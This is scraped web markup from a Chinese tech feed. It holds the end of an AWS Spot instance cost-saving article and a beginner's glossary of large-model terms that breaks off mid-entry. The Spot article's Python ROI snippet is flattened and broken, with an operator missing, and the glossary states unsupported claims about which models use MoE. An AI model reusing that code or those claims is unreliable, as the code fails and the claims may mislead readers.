                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文由云枢国际yunshuguoji撰写。</p>
<h2 data-id="heading-0">一、引言</h2>
<p>在云计算领域，成本优化始终是企业关注的核心问题。随着业务规模的扩大，云资源的消耗也在不断攀升，如何有效降低成本成为当务之急。而AWS Spot实例的出现，为企业提供了一种大幅降低计算成本的可能性，甚至可以实现高达70%的成本节约。本文将为您系统化介绍如何通过Spot实例实现这一目标。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef1c4e8d9581494b9f629420aec1e596~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5rig6YGT5ZWGeXVuc2h1Z3Vvamk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834703&amp;x-signature=oYIKHU%2B5kh0XMNaJU4EghftXr%2Bc%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-1">二、概述</h2>
<p>Spot实例是AWS提供的一种特殊类型的EC2实例，它们利用AWS数据中心的闲置计算资源，以极低的价格（通常比按需实例低70%-90%）提供给用户。然而，Spot实例有一个特点：当AWS需要回收资源时，实例可能会被中断（提前两分钟通知）。因此，它们非常适合具有容错能力的应用场景，如批处理作业、大数据分析、容器化工作负载等。</p>
<h2 data-id="heading-2">三、怎么使用Spot实例实现成本降低70%？</h2>
<ol>
<li>
<p>选择合适的应用场景：并非所有业务都适合使用Spot实例。那些可以中断的计算任务，如数据处理、渲染、测试环境等，是Spot实例的理想选择。对于无状态服务，结合自动伸缩组和多个可用区部署，也能有效提高稳定性。</p>
</li>
<li>
<p>竞价策略设置：在启动Spot实例时，您可以设置一个最高价（通常建议设置为按需实例的价格），当市场价格低于您的最高价时，实例就会运行。同时，使用Spot实例池（多个实例类型和可用区）可以增加请求成功的概率。</p>
</li>
<li>
<p>容错架构设计：由于Spot实例可能被中断，您需要设计容错机制。例如，使用自动伸缩组（Auto Scaling Group）来在实例中断时自动补充新的实例；将工作负载分布到多个实例类型和可用区；结合使用按需实例或预留实例作为保障，确保关键业务不中断。</p>
</li>
<li>
<p>监控与优化：利用AWS的成本管理工具（如Cost Explorer）和监控工具（如CloudWatch）来跟踪Spot实例的使用情况和成本节约效果。根据历史数据调整竞价策略和实例类型组合，进一步优化成本。<br/>
通过以上策略，许多企业成功将计算成本降低了70%甚至更多。例如，某大数据公司通过将数据处理任务迁移到Spot实例，节省了75%的计算成本。</p>
</li>
</ol>
<h2 data-id="heading-3">四、成本监控与优化</h2>
<h2 data-id="heading-4">1. 成本效益分析</h2>
<p>投资回报计算：</p>
<p>def calculate_roi(ondemand_cost, spot_utilization, interruption_cost):</p>
<p>计算Spot实例的投资回报率</p>
<p>spot_saving = ondemand_cost * 0.7 # 基础节省70%</p>
<p>interruption_loss = interruption_cost * 0.05 # 假设5%中断率</p>
<p>net_saving = spot_saving interruption_loss</p>
<p>roi = (net_saving / ondemand_cost) * 100</p>
<p>return {</p>
<p>'年度节省': net_saving,</p>
<p>'投资回报率': f'{roi:.1f}%',</p>
<p>'中断影响': f'{interruption_loss:.1f}'</p>
<p>}</p>
<h2 data-id="heading-5">2. 风险控制策略</h2>
<p>中断风险对冲：</p>
<p>风险控制措施:</p>
<p>价格监控:</p>
<p>设置价格告警: Spot价格 &gt; 按需80%时告警</p>
<p>自动转换: 价格不利时切换到按需实例</p>
<p>容量保障:</p>
<p>多可用区部署: 避免单点失效</p>
<p>多实例类型: 增加容量池多样性</p>
<p>容量预留: 关键业务预留按需容量</p>
<p>业务连续性:</p>
<p>优雅降级: Spot中断时保障核心功能</p>
<p>快速恢复: 2分钟内完成实例替换</p>
<p>数据持久化: 防止数据丢失</p>
<h2 data-id="heading-6">五、总结</h2>
<p>Spot实例是AWS用户实现成本优化的利器。通过合理选择应用场景、设置竞价策略、设计容错架构以及持续监控优化，您可以充分利用Spot实例节省高达70%的云成本。当然，成功使用Spot实例需要一定的经验和对业务负载的理解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI大模型基础概念扫盲篇：Agent、Token、MoE、RAG、Embedding、对齐、Transformer、预训练、微调]]></title>    <link>https://juejin.cn/post/7577042851080126507</link>    <guid>https://juejin.cn/post/7577042851080126507</guid>    <pubDate>2025-11-27T07:35:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851080126507" data-draft-id="7577171133444685860" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI大模型基础概念扫盲篇：Agent、Token、MoE、RAG、Embedding、对齐、Transformer、预训练、微调"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-11-27T07:35:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智泊AI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI大模型基础概念扫盲篇：Agent、Token、MoE、RAG、Embedding、对齐、Transformer、预训练、微调
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智泊AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:35:42.000Z" title="Thu Nov 27 2025 07:35:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>1、Al Agent（智能体）</strong></p>
<p>OpenAl对Al Agent的定义是: 以大语言模型为核心驱动，具备自主感知需求、拆解任务、记忆信息、调用工具能力，能端到端完成复杂目标的智能系统。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd1b2aaec6e74a429f34a9ea0448cd05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=oFPLjr1ClIezxcOyI1TdrHgBXmU%3D" alt="图片" loading="lazy"/></p>
<p>如果用现实场景类比，它就像一位“全能虚拟助理”--比如在电商运营中，AlAgent能自动读取用户消费数据、分析需求偏好、生成个性化推荐文案，甚至联动CRM系统发送营销消息，全程无需人工干预，既不会疲劳，也能精准贴合业务目标。</p>
<p><strong>2、Token （tokens）</strong></p>
<p>Token是大语言模型(LLM)处理自然语言的“最小单位”，可以理解为AI眼中的“字或词”，但并非完全对应人类语言的字词一比如“人工智能”可能被拆成1个Token，而“unbelievable”可能被拆成“un_”“believe”“-able”3个Token。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d592a5bdf1b5467b92dda78207528426~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=FGFzgqDZYGcZebeQuf5IV94PHWY%3D" alt="图片" loading="lazy"/></p>
<p>对产品经理来说，理解Token的核心价值在于“控制成本与效果”比如调用GPT-4 API时，输入和输出都会消耗Token，且不同模型的Token上限不同(如GPT-4o的上下文窗口为128kToken)，这直接影响产品的功能设计(如是否支持超长文档处理)和成本预算。</p>
<p><strong>3、嵌入模型（Embedding Model）</strong></p>
<p>嵌入模型的核心作用，是将文本、图片、音频等非结构化数据转化为一串能被计算机理解的“数值向量”(向量维度通常为几百到几千)，且向量的“距离”能反映数据的“语义相似度”--比如“猫”和“狗”的向量距离，会比“猫”和“汽车”更近。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9bfb302588f4ddaaf1b1cd491b3e5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=FPDXhK1lfyPxQJcL8xPW1D7uUe8%3D" alt="图片" loading="lazy"/></p>
<p>在实际产品中，嵌入模型是很多功能的“隐形支柱”:比如文档问答产品的“内容检索”，就是通过嵌入模型将用户问题和文档内容转化为向量，再快速匹配最相关的片段;电商平台的“相似商品推荐”也是基于商品描述的向量相似度来实现的。</p>
<p><strong>4、大模型幻觉（Hallucination）</strong></p>
<p>大模型幻觉是指AI在生成内容时，自信地输出错误、虚构或不存在的信息(比如编造虚假的文献引用、错误的历史事件)，但它并非“故意说谎”，而是因为模型在训练中学习的是“语言概率分布”而非“事实真实性”--当遇到知识盲区时，会基于已有模式“合理推测”，最终导致输出偏离事实。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8466714fa6a34912aa2dc37f69e8c1d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=r9OgbddzxsbOs6VUe52dljOpMbY%3D" alt="图片" loading="lazy"/></p>
<p>对产品经理而言，解决幻觉是AI产品落地的关键:比如在医疗咨询类产品中，需通过“引入权威知识库(如RAG)+输出内容溯源”来降低幻觉风险;在法律文书生成场景中，要增加“人工审核环节”，避免因AI幻觉导致法律纠纷。</p>
<p><strong>5、对齐（Alignment）</strong></p>
<p>对齐的核心目标，是让AI系统的行为、目标与人类的价值观、需求保持一致--不仅要让A1“听懂指令”，还要“理解指令背后的真实意图”，避免出现“机械执行却偏离需求”的情况(比如用户说“帮我找一篇短一点的文章”，AI不会故意找一篇超长文章，也不会找内容无关的短文)。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1858d6b1dbb49eb9f6e7dc2ddffd577~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=jDDlcnirp2nI8UzoIE0Bue%2BaV7k%3D" alt="图片" loading="lazy"/></p>
<p>工程师实现对齐的常见手段包括:通过“人类反馈强化学习(RLHF)”让AI学习人类偏好，通过“价值观注入训练”规避有害内容(如暴力、歧视)，通过“多轮对话纠错”让AI动态调整行为。</p>
<p>对产品经理来说，对齐程度直接影响用户体验--比如智能客服若无法对齐用户的真实需求，会导致用户反复沟通却无法解决问题。</p>
<p><strong>6、大模型（Large Model）</strong></p>
<p>大模型本质是“参数规模超大的深度学习模型”，通常拥有数十亿到数万亿个参数(参数可类比为人类大脑中的“神经元连接”)(如全网文本、图片、代码)，具备理解、生成、通过学习海量数据推理等复杂能力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14b64aa9409648c09e8c4e4c879419e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=XBZ60eylR2m3aOREpdp%2F2BuFsBI%3D" alt="图片" loading="lazy"/></p>
<p>与传统AI模型相比，大模型的核心优势是“泛化能力强””--比如传统模型可能只能做“文本分类”，而大模型(如GPT-4、文心一言)既能写文案、做翻译，也能解数学题、生成代码，甚至辅助设计产品方案。</p>
<p>对产品经理而言，大模型的“多能力集成”特性，让“一站式AI产品”成为可能(如集成问答、创作、数据分析的办公助手)。</p>
<p><strong>7、Transformer（转换器）</strong></p>
<p>如果把AI模型比作“智能手机”，那么Transformer就是“芯片”——它不直接负责“拍照”“聊天”等具体功能，而是提供“高效处理信息”的核心能力，是目前主流大模型(如GPT系列、LLaMA系列)的基础架构。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60c2e32fb7364aaebfaaaa53daaaed61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=UeOqwLIoFQnPis8FqgKXMTGI4O4%3D" alt="图片" loading="lazy"/></p>
<p>Transformer的核心优势来自“注意力机制(Attention)”:它能像人类阅读一样，重点关注文本中“关联性强的部分”(比如读“小明给小红送了一本书”时，会关注“小明”“小红”“书”的关系)同时支持“并行计算”(比传统架构处理速度快数倍)。</p>
<p>对产品经理来说，基于Transformer的模型意味着“更快的响应速度”和“更精准的语义理解”，这是设计AI产品时的重要技术前提。</p>
<p><strong>8、MOE（混合专家模型）</strong></p>
<p>MOE(Mixture of Experts，混合专家模型)是一种“分而治之”的模型架构：它将大模型拆分为多个“子模型(专家)”’，每个专家专注处理某一类任务或数据(比如有的专家擅长“代码生成”，有的擅长“文本翻译”，有的擅长“逻辑推理”)，再通过一个“门控网络”，根据输入内容选择合适的专家组合来完成任务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4f6146bc43247619a2e469a9bf138bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=6Zn7EEK4tHyhlYn4Fs5%2F%2BywOuCg%3D" alt="图片" loading="lazy"/></p>
<p>MOE的核心价值是“平衡性能与成本”:比如要让模型同时支持“代码”“文案”“数据分析”多种任务，若用单一模型需超大参数规模(成本高)，而MOE只需让不同专家各司其职，既能保证任务精度，又能降低计算资源消耗。</p>
<p>目前GPT-4、PaLM 2等模型都采用了MOE架构，是未来大模型“轻量化落地”的重要方向。</p>
<p><strong>9、预训练(Pre-training)</strong></p>
<p>预训练是大模型的“基础学习阶段”:在这个阶段，模型会在海量无标注数据(如全网公开的文本、书籍、代码)上进行训练，目标是学习“通用知识和语言规律”--就像学生在学校学习“语文、数学、英语”等基础学科，不针对某一特定职业，而是构建广博的知识基础。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adfc5dfac17544a7b8843f91f8f21d60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=71Izauv0F4RNjsstfrQVnlTE%2BuQ%3D" alt="图片" loading="lazy"/></p>
<p>预训练的核心特点是“无监督/弱监督”(无需人工标注数据类别)，训练周期长、资源消耗大(通常需要数千张GPU卡运行数周)，但能为模型打下“通用能力”基础。</p>
<p>目前市面上的开源大模型(如LLaMA3、Qwen)大多提供“预训练权重”，企业可基于此进行后续优化，大幅降低研发成本。</p>
<p><strong>10、微调(Fine-tuning)</strong></p>
<p>微调是在“预训练基础上的定向优化”: 通过给预训练模型输入“特定领域的有标注数据”(如医疗领域的病历、法律领域的法条)，让模型专注学习某一领域的知识和任务逻辑-一就像学生在大学选择“医学专业”，通过针对性学习成为医疗领域的专家。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/170af3b1ff79496a81bd505c513ba7e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=fkhcADi2rofID8RE2hP%2Bxpr8F%2BQ%3D" alt="图片" loading="lazy"/></p>
<p>微调分为“全参数微调”(调整模型所有参数，效果好但成本高)和“高效微调”(如LORA、OLORA，仅调整部分参数，成本低、速度快)。</p>
<p>对产品经理而言，微调是实现“AI产品领域化”的关键:比如要做一款“法律AI助手”，就需用法律文书数据微调通用大模型，让其能精准理解法律术语、生成合规文书。</p>
<p><strong>11、提示工程(Prompt Engineering)</strong></p>
<p>提示工程是“通过优化输入给模型的'提示词’，让模型生成更符合需求的输出”的技术--简单来说，就是“用更精准的语言'指挥’AI干活”。</p>
<p>比如想让AI写一篇“手机测评文案”，若只说“写一篇手机测评”，输出可能杂乱无章;但如果提示“以'年轻人性价比之选’为主题，从性能、续航、外观三个维度写手机测评，每部分100字左右，语言活泼”，输出会更精准。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f6fe2a6e7a0403685e9a16cbd5775be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=AhFJnk9IHwDkJbcrovi9F7MfyHI%3D" alt="图片" loading="lazy"/></p>
<p>提示工程的核心技巧包括:明确任务目标、提供上下文信息、设定输出格式、加入示例(少样本提示)。</p>
<p>对产品经理而言，优秀的提示工程能“在不修改模型的情况下提升产品效果”--比如智能客服产品，通过优化用户问题的“提示词模板”，能让AI更快速地定位用户问题，减少无效回复。</p>
<p><strong>12、RAG(检索增强生成)</strong></p>
<p>RAG(Retrieval-Augmented Generation，检索增强生成)是一种“让AI'先查资料再回答’”的技术: 它的工作流程分为三步：</p>
<p>① 用户提出问题后，系统先从“外部知识库”(如文档库、数据库、网页)中检索与问题相关的信息;</p>
<p>②将检索到的信息与用户问题整合为“上下文+提示词”;</p>
<p>③ 让大模型基于这些信息生成回答。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42c7250beb2f4e10b1b7d78dab75fb80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=NTrBVbzxdlXj%2BkLrc5gIPJWdYZE%3D" alt="图片" loading="lazy"/></p>
<p>RAG的核心优势是“提升回答的准确性和可溯源性”:比如传统大模型回答“某公司2024年营收”时，可能因知识过时生成错误数据，而RAG会先检索该公司2024年的财报，再基于财报内容生成准确回答，且能标注数据来源。</p>
<p>目前RAG已广泛应用于“企业知识库问答”“法律文书生成”“学术论文辅助写作”等场景。</p>
<p><strong>13、MCP</strong>(模型上下文协议)</p>
<p>MCP(ModelContextProtocol，模型上下文协议)是Anthropic在2024年11月推出的“开放标准”，核心作用是“统一大模型与外部工具、数据源的'通信语言’”。</p>
<p>在此之前，不同工具(如数据库、API、第三方服务)与大模型的交互方式各不相同，开发人员需要为每个工具单独写适配代码。</p>
<p>而MCP通过定义统一的“上下文格式”和“交互规则”，让大模型能像“用同一门语言和不同人对话一样，无缝对接数千种外部工具。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6a6e46575bf477ea0c04a9ad8bb790b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=dTk2bZd8Ek4jaKtZbPn%2FZIpO2Cw%3D" alt="图片" loading="lazy"/></p>
<p>MCP对产品经理的价值在于“加速AI产品的'工具集成’能力”: 比如想做一款“AI办公助手”，需要集成“文档处理、日程管理、邮件发送”等工具，基于MCP标准，无需重复开发适配逻辑，能快速实现工具对接，缩短产品上线周期。</p>
<p>未来MCP有望成为行业通用标准，进一步降低AI产品的开发门槛。</p>
<p><strong>14、知识图谱(Knowledge Graph)</strong></p>
<p>知识图谱是“用图形化方式表示实体、关系和属性的结构化知识库”--它不像传统数据库那样“机械存储数据”，而是将知识组织成“节点(实体，如'苹果’'乔布斯’)+边(关系，如'乔布斯创立了苹果’)”的网络，让计算机能清晰理解“事物之间的关联”</p>
